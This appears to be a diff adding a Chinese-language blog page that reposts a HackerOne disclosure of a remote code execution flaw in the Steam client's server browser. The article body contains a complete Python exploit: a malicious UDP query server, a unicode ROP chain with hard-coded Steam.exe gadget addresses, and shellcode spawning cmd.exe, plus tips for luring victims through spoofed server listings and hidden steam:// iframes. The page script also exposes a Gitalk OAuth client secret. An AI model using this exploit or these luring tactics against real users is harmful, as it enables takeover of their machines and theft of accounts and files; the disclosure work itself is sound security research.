@@ -1,0 +1,709 @@
+<!--
+	作者：Sariay
+	时间：2018-09-25
+	描述：There may be a bug, but don't worry, QiLing(器灵) says that it can work normally!
+-->
+
+
+	<!DOCTYPE html>
+	<html>
+		
+
+<head><meta name="generator" content="Hexo 3.8.0">
+	<title>通过Server Info中的缓冲区溢出在Steam客户端上运行RCE</title>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="apple-mobile-web-app-title" content="Amaze UI">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+    <meta name="author" content="miraitowa">
+    <meta name="keywords" content="">
+    <meta name="description" content="">
+   	<!-- css -->
+	<link rel="stylesheet" href="/css/style.css">
+
+	<!-- favicon -->
+	<link href="/img/favicon.ico" rel="Shortcut Icon" type="image/ico">
+	
+	<!-- font-awesome -->
+	<link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+</head>
+
+	<body>	
+		<!--Preloader-->
+<div id="preloader">
+	<div id="status">
+		<img alt="PRELOADER" src="/img/logo.png">
+	</div>
+</div>
+<!--Preloader end-->
+
+<!-- header -->
+
+	<header id="header-bg-2">
+
+	
+		<div id="cd-logo"><a href="/"><img src="/img/logo.png" alt="Logo"></a></div>
+	
+	
+	<!-- motto or description -->
+		
+ 		<p class="motto"></p>
+	
+	
+	<!-- current page name or title -->
+	
+		
+		
+			
+			<p class="page-name">当前文章&nbsp;:&nbsp;《通过Server Info中的缓冲区溢出在Steam客户端上运行RCE》</p>
+			
+		
+	
+	
+	<!-- others: such as change-bg, time... -->
+	<p class="page-name-other">
+		3/21/2019 
+		<style type="text/css">
+	header:after {
+		content: '';
+		position: relative;
+		top: 0;
+		left: 0;
+		height: 100%;
+		width: 100%;
+		background: #222222;
+		opacity: .5;
+		z-index: -1;
+	}
+	
+	.change-header-bg{
+		font-style: normal;
+	}
+	.change-header-bg i{
+		text-align: center;
+		cursor: pointer;
+		pointer-events: bounding-box;
+	}
+	@media(max-width:512px) {
+		.change-header-bg {
+			display: none;
+			visibility: hidden;
+		}
+	}
+	
+</style>
+
+<script type="text/javascript">
+	function changeHeaderBg(){
+		var random_bg = Math.floor(Math.random() * 109 + 1);
+		var bg = 'url(https://miraitowa.github.io/Random-img/' + random_bg + '.jpg)';
+		$("#header-bg-2").css("background-image", bg);
+	}
+</script>
+
+<span class="change-header-bg">
+	——&nbsp;<i class="fa fa-camera-retro" onclick="changeHeaderBg()"></i>	
+</span>
+	</p>		
+</header>
+
+<!-- nav -->
+<div id="cd-nav">
+	<a href="#0" title="menu" class="cd-nav-trigger"><span></span></a>
+
+	<nav id="cd-main-nav">
+		<ul>
+			
+      		<li class="fa fa-/">
+           		<a href="/" title="主页">主页</a>	
+      		</li>
+    		
+      		<li class="fa fa-/archives">
+           		<a href="/archives" title="归档">归档</a>	
+      		</li>
+    		
+      		<li class="fa fa-/categories">
+           		<a href="/categories" title="分类">分类</a>	
+      		</li>
+    		
+      		<li class="fa fa-/gallery">
+           		<a href="/gallery" title="相册">相册</a>	
+      		</li>
+    		
+      		<li class="fa fa-/about">
+           		<a href="/about" title="关于">关于</a>	
+      		</li>
+    		
+      		<li class="fa fa-/tags">
+           		<a href="/tags" title="友链">友链</a>	
+      		</li>
+    		
+    		
+        	
+		</ul>
+	</nav>
+</div>
+
+		<!--main-->
+		<main> 
+		<div class="page-container">
+		<!-- content srart -->
+<div class="am-g am-g-fixed blog-fixed blog-content">
+	<div class="am-u-md-8 am-u-sm-12">
+
+		<article class="am-article blog-article-p">
+
+			<div class="am-article-hd">
+				
+
+
+				<h1 class="am-article-title blog-text-center">
+					
+					
+	
+		<a href="/2019/03/21/通过Server Info中的缓冲区溢出在Steam客户端上运行RCE/" itemprop="url">		
+			通过Server Info中的缓冲区溢出在Steam客户端上运行RCE		
+		</a>
+	
+
+				</h1>
+
+				<p class="am-article-meta blog-text-center">
+					<span>
+						<i class="fa fa-clock-o"></i> 
+						<a href="/2019/03/21/通过Server Info中的缓冲区溢出在Steam客户端上运行RCE/" itemprop="url">
+	<time datetime="2019-03-21T02:30:13.621Z" itemprop="datePublished">
+  		2019-03-21
+  </time>
+</a>    
+&nbsp;
+					</span>
+					
+					<span>						
+						
+					</span>
+				</p>
+			</div>
+
+			<div class="am-article-bd">
+				<div class="content" id="post-content">
+					
+						<h2 id="通过Server-Info中的缓冲区溢出在Steam客户端上运行RCE"><a href="#通过Server-Info中的缓冲区溢出在Steam客户端上运行RCE" class="headerlink" title="通过Server Info中的缓冲区溢出在Steam客户端上运行RCE"></a>通过Server Info中的缓冲区溢出在Steam客户端上运行RCE</h2><p>原文链接：<a href="https://hackerone.com/reports/470520" target="_blank" rel="noopener">https://hackerone.com/reports/470520</a></p>
+<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>在Steam和其他阀门游戏（CSGO，Half-Life，TF2）中，有一种功能可以找到称为服务器浏览器的游戏服务器。为了检索有关这些服务器的信息，</p>
+<p>服务器浏览器与称为服务器查询的特定UDP协议进行通信。该协议在Steam的在线开发人员手册中有详细描述。我们实现了一个自定义python服务器，</p>
+<p>它只使用文档中提供的相同信息回复协议。在成功实施协议之后，我们模糊了几个参数，并注意到Steam客户端在从我们的自定义服务器</p>
+<p>接收回复时崩溃了。更具体地说，当我们回复A2S_PLAYER响应中使用的大型播放器名称时，客户端崩溃了。连接调试器时，</p>
+<p>我们注意到它由于基于堆栈的缓冲区溢出而崩溃。</p>
+<p>这清楚地表明出现了问题，我们进一步调查了它，以便能够利用缓冲区溢出。经过进一步检查，我们注意到serverbrowser库中发生了溢出。</p>
+<p>在某些时候，玩家的名字被转换为unicode，并且因为没有检查边界而发生溢出。此外，没有任何金丝雀保护，</p>
+<p>这允许我们覆盖返回地址并在Windows上执行任意代码。</p>
+<h3 id="利用细节"><a href="#利用细节" class="headerlink" title="利用细节"></a>利用细节</h3><p>我们想证明影响并建立一个漏洞。首先，我们在Linux上测试它，我们能够通过覆盖返回地址立即控制执行流程。但是，在Linux上，</p>
+<p>我们只能控制EIP寄存器的两个字节（例如0x00004141），我们没有进一步探索它。在OSX上，进程终止SIGABRT，</p>
+<p>这意味着OSX上的库中可能存在一个canary保护。然后，我们尝试在Windows上利用它，我们成功（在Windows 8.1和10上测试）。</p>
+<p>在Windows上，通过UDP发送播放器名称A*1100会导致以下堆栈布局：</p>
+<pre><code>0x00410041
+0x00410041
+...
+</code></pre><p>这是由于unicode转换（wide-char）而发生的，因为播放器名称可以使用unicode字符。使用unicode字符发送播放器名称u”\u4141”*1100会导致以下布局：</p>
+<pre><code>0x41414141
+0x41414141
+...
+</code></pre><p>但是，由于我们在函数返回之前破坏了堆栈和寄存器，因此我们无法控制EIP寄存器。取消引用edi寄存器后程序崩溃，但我们控制了它。我们使用Steam.exe二进制文件中的常量值满足这些特殊条件：</p>
+<p><img src="https://i.imgur.com/7DgtVy6.png" alt=""></p>
+<p>然后，我们构建了一个Steam.exe只带有小工具的unicode ROP链，VirtualProtect动态调用以使堆栈可执行并跳转到我们的unicode shellcode来执行cmd.exe。这是一个很大的挑战，因为我们不能使用像0x00000040我们的ROP链中的值，否则字符串将被终止。我们不能使用无效的unicode字符，u”\uda01”因为库用问号替换它们?- 0x003F。</p>
+<p>注意：所有内容都是使用Steam.exe基址计算的。如果重新启动Windows 8或Windows 10，则此地址会更改，而不是重新启动Steam。如果您在漏洞利用中编辑基址，则该漏洞100％可靠，但由于ASLR，您无法预测受害者计算机中的基址。但是，我们有两种开发方案：</p>
+<p>只有9位被随机化：攻击者可以成功利用概率为0.2％（1/512）的受害者，如果我们正在谈论攻击者大量向所有Steam用户分发此漏洞（每个新受害者1人），这就足够了平均512次尝试）<br>此漏洞可能与另一个内存泄漏漏洞链接，使其100％可靠<br>重现步骤<br>首先，确保已安装Steam。如果您使用的是测试版，请在漏洞利用代码中取消注释测试版小工具。</p>
+<pre><code>1 - 下载附件：steam_serverinfo_exploit.py（F395515）
+2 - 使用像Immunity Debugger这样的调试器并附加到Steam.exe 
+3 - 获取Steam.exe（View&gt; Executable modules）的基地址并编辑STEAM_BASE变量steam_serverinfo_exploit.py以使漏洞100％可靠
+</code></pre><p><img src="https://i.imgur.com/jh0V2M3.png" alt=""></p>
+<pre><code>4 - 在您选择的服务器上运行漏洞利用（例如localhost）：python steam_serverinfo_exploit.py
+5 - POC.html在iframe src
+6中编辑并更改服务器的IP地址- 在浏览器中打开它并等待cmd.exe执行
+7 - 您也可以打开服务器菜单中的浏览器（查看&gt;服务器）并单击View server info以触​​发漏洞利用（如果您在同一网络中运行服务器，它将出现在LAN部分中）
+</code></pre><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><p><strong>Steamclient_POC_Windows10.mp4：</strong>包含通过与Steam服务器浏览器手动交互在Windows 10上触发的漏洞利用的视频</p>
+<p><strong>SteamURL_POC_Windows10.mp4：</strong>包含通过恶意网页在Windows 10上触发的漏洞利用视频，其中包含将自动触发漏洞利用的隐藏iframe。</p>
+<p>在视频中，Steam在访问恶意页面时未运行，并且自动启动。这在Steam已经运行时也有效。</p>
+<pre><code>POC.html（F395519）
+</code></pre><p>包含SteamURL视频中使用的html页面代码。</p>
+<h3 id="利用代码："><a href="#利用代码：" class="headerlink" title="利用代码："></a>利用代码：</h3><pre><code>import logging
+import socket
+import textwrap
+
+
+### Exploit for Server Info - Player Name buffer overflow (Steam.exe - Windows 8 and 10) #######
+# More info: https://developer.valvesoftware.com/wiki/Server_queries
+# Shellcode must contain valid unicode characters, pad with NOPs :)
+
+
+STEAM_BASE = 0x01180000
+
+# Shellcode: open cmd.exe
+shellcode = &quot;\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x90\x8b\x52\x78\x01\xda\x8b\x72\x20\x90\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x90\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x90\x01\xda\x31\xf6\x89\xd6\x31\xff\x89\xdf\x31\xc9\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd2\x83\xc4\x0c\x31\xc9\x68\x65\x73\x73\x42\x88\x4c\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x54\x57\x31\xff\x89\xc7\xff\xd6\x83\xc4\x0c\x31\xc9\x51\x68\x64\x6c\x6c\x41\x88\x4c\x24\x03\x68\x6c\x33\x32\x2e\x68\x73\x68\x65\x6c\x54\x31\xd2\x89\xfa\x89\xc7\xff\xd2\x83\xc4\x0b\x31\xc9\x68\x41\x42\x42\x42\x88\x4c\x24\x01\x68\x63\x75\x74\x65\x68\x6c\x45\x78\x65\x68\x53\x68\x65\x6c\x54\x50\xff\xd6\x83\xc4\x0d\x31\xc9\x68\x65\x78\x65\x41\x88\x4c\x24\x03\x68\x63\x6d\x64\x2e\x54\x59\x31\xd2\x42\x52\x31\xd2\x52\x52\x51\x52\x52\xff\xd0\xff\xd7&quot;
+
+
+def udp_server(host=&quot;0.0.0.0&quot;, port=27015):
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+print(&quot;[*] Starting TSQuery UDP server on host: %s and port: %s&quot; % (host, port))
+s.bind((host, port))
+while True:
+(data, addr) = s.recvfrom(128*1024)
+requestType = checkRequestType(data)
+if requestType == &quot;INFO&quot;:
+response = createINFOReply()
+elif requestType == &quot;PLAYER&quot;:
+response = createPLAYERReply()
+print(&quot;[+] Payload sent!&quot;)
+else:
+response = &#39;nope&#39;
+s.sendto(response,addr)
+yield data
+
+
+def checkRequestType(data):
+# Header byte contains the type of request
+header = data[4]
+if header == &quot;\x54&quot;:
+print(&quot;[*] Received A2S_INFO request&quot;)
+return &quot;INFO&quot;
+elif header == &quot;\x55&quot;:
+print(&quot;[*] Received A2S_PLAYER request&quot;)
+return &quot;PLAYER&quot;
+else:
+print &quot;Unknown request&quot;
+return &quot;UNKNOWN&quot;
+
+
+def createINFOReply():
+# A2S_INFO response
+# Retrieves information about the server including, but not limited to: its name, the map currently being played, and the number of players.
+pre = &quot;\xFF\xFF\xFF\xFF&quot; # Pre (4 bytes)
+header = &quot;\x49&quot;  # Header (1 byte)
+protocol = &quot;\x02&quot;# Protocol version (1 byte)
+name = &quot;@Kernelpanic and [@0xacb](/0xacb) Server&quot; + &quot;\x00&quot; # Server name (string)
+map_name = &quot;de_dust2&quot; + &quot;\x00&quot; # Map name (string)
+folder = &quot;csgo&quot; + &quot;\x00&quot; # Name of the folder contianing the game files (string)
+game = &quot;Counter-Strike: Global Offensive&quot; + &quot;\x00&quot; # Game name (string)
+ID = &quot;\xda\x02&quot; # Game ID (short)
+players = &quot;\xFF&quot; # Amount of players in the server (byte)
+maxplayers = &quot;\xFF&quot; # Max player allowed (byte)
+bots = &quot;\x00&quot; # Bots in game (byte)
+server_type = &quot;d&quot; # Server type, d = dedicate (byte)
+environment = &quot;l&quot; # Hosted on windows linux or mac, l is linux (byte)
+visibility = &quot;\x00&quot; # Password needed? (byte)
+VAC = &quot;\x01&quot; # VAC enabled? (byte)
+version = &quot;1.3.6.7.1\x00&quot;
+return pre + header + protocol + name + map_name + folder + game + ID + players + maxplayers + bots + server_type + environment + visibility + VAC + version
+
+
+def to_unicode(addr):
+a = addr &amp; 0xffff;
+b = addr &gt;&gt; 16;
+return eval(&#39;u&quot;\\u%s\\u%s&quot;&#39; % (hex(a)[2:].zfill(4), hex(b)[2:].zfill(4)))
+
+
+def convert_addr(gadget):
+return to_unicode(STEAM_BASE + gadget - 0x400000)
+
+
+def convert_shellcode(code):
+code = code + &quot;\x90&quot;*8 #pad with nops
+output = &quot;&quot;
+l = textwrap.wrap(code.encode(&quot;hex&quot;), 2)
+for i in range(0, len(l)-4, 4):
+output += &quot;\\u%s%s\\u%s%s&quot; % (l[i+1], l[i], l[i+3], l[i+2])
+return eval(&#39;u&quot;%s&quot;&#39; % output)
+
+
+def pwn():
+print(&quot;[*] Building ROP chain&quot;)
+
+# ROP gadgets for Steam.exe Nov 26 2018
+pop_eax = convert_addr(0x503ca7)
+pop_ecx = convert_addr(0x41bd9f)
+pop_edx = convert_addr(0x413a53)
+pop_ebx = convert_addr(0x40511c)
+pop_ebp = convert_addr(0x40247c)
+pop_esi = convert_addr(0x404de6)
+pop_edi = convert_addr(0x423839)
+jmp_esp = convert_addr(0x4413bd)
+pushad = convert_addr(0x425e00)
+ret_nop = convert_addr(0x401212)
+mov_edx_eax = convert_addr(0x5599a6)
+sub_eax_41e82c6a = convert_addr(0x51584f)
+mov_ebx_ecx_mov_ecx_eax_mov_eax_esi_pop_esi_ret = convert_addr(0x4e24eb)
+mov_esi_ptr_esi_mov_eax_esi_pop_esi = convert_addr(0x4506ea)
+xchg_eax_esi = convert_addr(0x543b86)
+
+writable_addr = convert_addr(0x69a01c)
+virtual_protect_idata = convert_addr(0x5f9280)
+new_protect = to_unicode(0x41e82c6a+0x40)
+msize = to_unicode(0x41e82c6a+0x501)
+
+&#39;&#39;&#39;
+# ROP gadgets for Steam.exe Beta Dec 14 2018
+pop_eax = convert_addr(0x425993)
+pop_ecx = convert_addr(0x41bd9f)
+pop_edx = convert_addr(0x413a53)
+pop_ebx = convert_addr(0x40511c)
+pop_ebp = convert_addr(0x40247c)
+pop_esi = convert_addr(0x404de6)
+pop_edi = convert_addr(0x423839)
+jmp_esp = convert_addr(0x4413bd)
+pushad = convert_addr(0x425e00)
+ret_nop = convert_addr(0x401212)
+mov_edx_eax = convert_addr(0x559d46)
+sub_eax_31e82c6a = convert_addr(0x515bbf)
+mov_ebx_ecx_mov_ecx_eax_mov_eax_esi_pop_esi_ret = convert_addr(0x4e284b)
+mov_esi_ptr_esi_mov_eax_esi_pop_esi = convert_addr(0x4506ea)
+xchg_eax_esi = convert_addr(0x515b5e)
+
+writable_addr = convert_addr(0x69a01c)
+virtual_protect_idata = convert_addr(0x5fa280)
+new_protect = to_unicode(0x31e82c6a+0x40)
+msize = to_unicode(0x31e82c6a+0x501)
+&#39;&#39;&#39;
+
+rop = pop_eax + msize + sub_eax_41e82c6a + mov_ebx_ecx_mov_ecx_eax_mov_eax_esi_pop_esi_ret \
+  + u&quot;\ub33f\ubeef&quot; + mov_ebx_ecx_mov_ecx_eax_mov_eax_esi_pop_esi_ret + ret_nop*0x10 \
+  + pop_ecx + writable_addr \
+  + pop_eax + new_protect + sub_eax_41e82c6a + mov_edx_eax \
+  + pop_ebp + jmp_esp + pop_esi + virtual_protect_idata \
+  + mov_esi_ptr_esi_mov_eax_esi_pop_esi + u&quot;\ub33f\ubeef&quot; + xchg_eax_esi + pop_edi \
+  + ret_nop + pop_eax + u&quot;\u9090\u9090&quot; + pushad
+
+#special conditions to avoid crashes
+special_condition_1 = to_unicode(STEAM_BASE + 0x10)
+special_condition_2 = to_unicode(STEAM_BASE + 0x11)
+payload = &quot;A&quot;*1024 + u&quot;\ub33f\ubeef&quot;*12 + special_condition_1 + special_condition_2*31 + rop + shellcode
+return payload.encode(&quot;utf-8&quot;) + &quot;\x00&quot;
+
+
+def createPLAYERReply():
+# A2S_player response
+# This query retrieves information about the players currently on the server.
+pre = &quot;\xFF\xFF\xFF\xFF&quot;# Pre (4 bytes)
+header = &quot;\x44&quot; # Header (1 byte)
+players = &quot;\x01&quot;# Amount of players (1 byte)
+indexPlayer1 = &quot;\x01&quot;   # Index of player (1 byte)
+
+namePlayer2 = pwn()
+scorePlayer2 = &quot;&quot;
+durationPlayer2  = &quot;&quot;
+return pre + header + players + indexPlayer1 + namePlayer2 + scorePlayer2 + durationPlayer2
+
+
+FORMAT_CONS = &#39;%(asctime)s %(name)-12s %(levelname)8s\t%(message)s&#39;
+logging.basicConfig(level=logging.DEBUG, format=FORMAT_CONS)
+
+if __name__ == &quot;__main__&quot;:
+shellcode = convert_shellcode(shellcode)
+for data in udp_server():
+pass
+</code></pre><h3 id="攻击手段"><a href="#攻击手段" class="headerlink" title="攻击手段"></a>攻击手段</h3><p>攻击者可以在查看恶意服务器的服务器信息的任何Steam用户的计算机上执行任意代码。通常，攻击者会启动与C2基础架构的后门连接，</p>
+<p>以获取对受害者计算机的访问权限。从那里攻击者可以做任何他/她想做的事情（例如，帐户接管，窃取Steam帐户中的所有项目，在操作系统中安装其他恶意软件，泄露文档等）</p>
+<p>有几种方法可以诱骗用户运行漏洞利用程序：</p>
+<ol>
+<li>用户在Steam客户端服务器浏览器中查看服务器信息</li>
+<li>用户访问Steam浏览器协议的攻击者的恶意网页 请求已启动： steam://connect/1.2.3.4</li>
+</ol>
+<p>此外，还有一些方法可以增加此次攻击的可能性：</p>
+<ol>
+<li>它可以通过使用蒸汽浏览器协议的网站触发</li>
+<li><p>许多用户不需要单击Open Steam浏览器上的按钮（始终在关联的应用程序中打开这些类型的链接✓）</p>
+<blockquote>
+<ol>
+<li>不包含漏洞的第一个Info Reply可以有一些有趣的值来欺骗用户。</li>
+</ol>
+</blockquote>
+</li>
+<li><p>可以选择服务器名称，并可以欺骗用户使用服务器</p>
+</li>
+<li>通过设置当前玩家数量较高的人更有可能加入</li>
+<li>地图名称还可以包含有趣的文本作为吸引人们的值</li>
+<li>如果服务器中的玩家数量等于服务器中允许的最大玩家数量，那么服务器信息框会自动打开，并且在第一次自动刷新后成功执行漏洞利用</li>
+</ol>
+<h3 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h3><p>Vinnie Vanhoecke @vinnievan和AndréBaptista@ 0xacb</p>
+<p><strong>6个附件：</strong></p>
+<ol>
+<li>F 395515 ： steam_serverinfo_exploit.py</li>
+<li>F 395516 ： special_condition.png</li>
+<li>F 395517 ： Steamclient_POC_Windows10.mp4</li>
+<li>F 395518 ： SteamURL_POC_Windows10.mp4</li>
+<li>F 395519 ： POC.html</li>
+<li>F 395520 ： steam_base_address.png</li>
+</ol>
+
+					
+				</div>
+			</div>
+		</article>
+
+		<ul class="am-pagination">
+    
+	
+		<li class="am-pagination-next">
+		<a class="pull-right" href="/2019/03/21/2019新起点/" title="2019新起点">
+			下一篇 &raquo;
+		</a>
+		</li>
+	 
+ </ul>
+        
+
+		<div class="theme-annie-comment-button-container">
+	<button id="annie-comment-button" class="theme-annie-comment-button" onclick="Annie_Comment()">
+		加载评论
+		<!--加载评论-->
+	</button>
+</div>
+
+<div id="annie-comment-container" class="theme-annie-comment-main-container">
+
+	
+		
+			<!-- comment gitalk -->
+			<!-- show gitalk comment -->
+
+  <div id="gitalk-container"></div>
+
+
+<!-- gitalk`s css & js -->
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<link rel="stylesheet" href="/css/comment.css">
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+	//thanks O-R
+	//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
+	//去除尾部匹配正则数组的字符串  
+	//remove redundant characters
+	String.prototype.trimEnd = function(regStr) {
+		var result = this;
+		if(regStr == undefined || regStr == null || regStr == "") {
+			return result;
+		}
+		var array = regStr.split(',');
+
+		if(array.length > 0) {
+
+			var c = array.shift();
+			var str = this;
+			var i = str.length;
+			var rg = new RegExp(c);
+			var matchArr = str.match(rg);
+
+			if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
+				var matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
+					.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
+					.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
+					.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
+					.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
+					.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
+					.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
+					.replace(/\./g, "\\.").replace(/\&/g, "\\&");
+				matchStr = matchStr + '$';
+				result = str.replace(new RegExp(matchStr), "");
+			}
+
+			if(array.length > 0) {
+				return result.trimEnd(array.join())
+			} else {
+				return result;
+			}
+		}
+	};
+
+	//create gitalk
+	var gitalk = new Gitalk({
+		clientID: '74a83cc9b15a1cf53e10',
+		clientSecret: 'b62af8b132c33178adcb0098e2315806e2e57cae',
+		//id: window.location.pathname,
+		// id: (window.location.pathname).split("/").pop().substring(0, 49),
+		id: md5(location.href.trimEnd('#.*$,\\?.*$,index.html$')),
+		repo: 'Annie-Gitalk',
+		owner: 'miraitowa',
+		admin: 'miraitowa',
+		distractionFreeMode: 'true',
+	})
+	gitalk.render('gitalk-container');
+</script>
+		
+	
+
+</div>
+
+<script type="text/javascript">
+	/* Show Comment */
+	var Annie_Comment = function() {
+		function Show_Hidden(obj) {
+			obj.style.display = 'block';
+		}
+		
+		//var obutton = $('#annie-comment-button');
+		//var obutton = $('#annie-comment-container');
+		var obutton = document.getElementById("annie-comment-button" || "0");
+		var odiv = document.getElementById("annie-comment-container");
+		if( 'obutton' ) {
+			obutton.onclick = function() {
+				Show_Hidden(odiv);
+				$("#annie-comment-button").css("display", 'none');
+				return false;
+			}
+		}
+	};
+
+	(function Annie_Init() {
+		Annie_Comment();
+	})();
+</script>
+		
+		<!--
+	时间：2018-09-24
+	描述：The TOC module refers to 'https://github.com/codefine/hexo-theme-mellow', include toc.ejs、toc.js、toc.css. All rights reserved by codefine. 
+-->
+
+	
+		<aside class="post-widget">
+			<nav class="post-toc-wrap" id="post-toc">
+				
+					<strong>文章目录</strong>
+				
+				
+				<!--toc(post.content)-->
+				<ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#通过Server-Info中的缓冲区溢出在Steam客户端上运行RCE"><span class="post-toc-text">通过Server Info中的缓冲区溢出在Steam客户端上运行RCE</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#介绍"><span class="post-toc-text">介绍</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#利用细节"><span class="post-toc-text">利用细节</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#PoC"><span class="post-toc-text">PoC</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#利用代码："><span class="post-toc-text">利用代码：</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#攻击手段"><span class="post-toc-text">攻击手段</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#感谢"><span class="post-toc-text">感谢</span></a></li></ol></li></ol>
+			</nav>
+			<div class="post-toc-bar"><div>
+		</div></div></aside>
+	
+
+	</div>
+</div>
+		</div>
+		</main>
+		
+		<!--footer-->
+		<footer>
+	<div class="blog-text-center">
+		<div class="theme-annie-social">
+				
+				
+					<a href="https://github.com/miraitowa" title="Github" target="_blank"><i class="fa fa-github"></i>&nbsp;</a>
+					
+				
+				
+					<a href="https://miraitowa.github.io/about/" title="Email" target="_blank"><i class="fa fa-envelope-o"></i>&nbsp;</a>
+					
+					
+						
+				
+		</div>
+	</div>
+
+	<div class="blog-text-center">
+		<div class="theme-annie-copyright">
+			
+				&copy; 2018 11 11 - 2019, content by miraitowa. All Rights Reserved.			       	
+			
+		</div>
+	</div>
+
+	<div class="blog-text-center">
+		<div class="theme-annie-copyright">
+			<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.		
+		</div>
+	</div>
+</footer>
+		<!-- <script src="http://code.jquery.com/jquery-2.1.1.min.js" type="text/javascript"></script> -->
+
+<script>
+	window.jQuery || document.write('<script src="/js/jquery-2.1.1.min.js"><\/script>')
+</script>
+
+<style>
+	.motto {
+		color: #000000;
+		font-size: 20px;
+		margin: 100px 25% 0;
+		width: 50%;
+		line-height: 1.4;
+		font-family:"KaiTi", "STXingkai", "Source Sans Pro", "Segoe UI", "Lucida Grande", Helvetica, Arial, "Microsoft YaHei", FreeSans, Arimo, "Droid Sans", "wenquanyi micro hei", "Hiragino Sans GB", "Hiragino Sans GB W3", FontAwesome, sans-serif;
+		text-align: center;
+	}
+	@media(max-width: 890px) {
+		.motto {	
+			margin: 100px 10% 0;
+			width: 80%;
+		}
+	}
+	@media(max-width: 890px) {
+		.motto {
+			margin: 100px 5% 0;
+			width: 90%;
+		}
+	}
+</style>
+
+
+	<script src="/js/motto.js"></script>
+	<script type="text/javascript">
+		$(".motto").html(getMingYanContent());
+	</script>	
+
+
+
+
+
+
+
+	<script type="text/javascript" src="/js/toc.js"></script>
+
+
+<script type="text/javascript" src="/js/main.js"></script>
+
+<script type="text/javascript">
+	//generate a random img that pre_name 'from 0 to 110'
+	var random_bg = Math.floor(Math.random() * 109 + 1);
+
+	//var bg = 'url(/img/random/' + random_bg + '.jpg)';		
+	var bg = 'url(https://miraitowa.github.io/Random-img/' + random_bg + '.jpg)';
+
+	$("#header-bg-2").css("background-image", bg);
+</script>
+		
+		<!--back to top-->
+        <style type="text/css">
+	#totop {
+		background: white;
+		border-radius: 50%;
+		position: fixed;
+		right: 5.4%;
+		bottom: 80px;
+		cursor: pointer;
+	}
+	
+	#totop a {
+		color: #474747;
+		background-color: transparent;
+		padding: 10px;
+		text-decoration: none;
+	}
+	
+	@media(max-width:512px) {
+		#totop {
+			display: none;
+			visibility: hidden;
+		}
+	}
+</style>
+
+
+	<div id="totop">
+  		<a href="javascript:;" class="fa fa-arrow-up"></a>
+	</div>
+
+	</body>
+	</html>
+
